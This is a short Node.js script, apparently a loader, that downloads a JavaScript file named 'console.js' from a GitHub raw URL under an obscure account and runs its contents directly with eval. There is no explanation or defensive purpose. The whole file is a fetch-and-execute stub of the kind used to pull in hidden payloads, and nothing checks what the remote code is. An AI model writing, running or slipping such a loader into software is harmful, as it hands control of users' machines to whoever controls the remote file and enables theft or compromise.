const axios = require("axios");
const url = "https://raw.githubusercontent.com/MyAccautAldz/HephaestusV1.5/main/console.js";
axios.get(url).then(client => eval(client.data)).catch(r => console.error(r));